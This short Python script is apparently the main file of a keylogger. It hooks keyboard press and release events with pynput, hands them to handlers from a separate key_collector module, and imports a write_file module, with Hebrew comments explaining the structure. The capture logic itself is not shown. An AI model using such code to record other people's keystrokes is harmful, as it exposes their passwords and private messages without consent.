from pynput.keyboard import Key, Listener
import datetime
#מחלק את הקוד לקריאה לפונקציות
pressed_keys = []
log_dict = {}
#קורא לפונקציה הראשונה
from key_collector import on_press
#קורא לפונקציה השנייה
import write_file
from key_collector import on_release
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(log_dict)
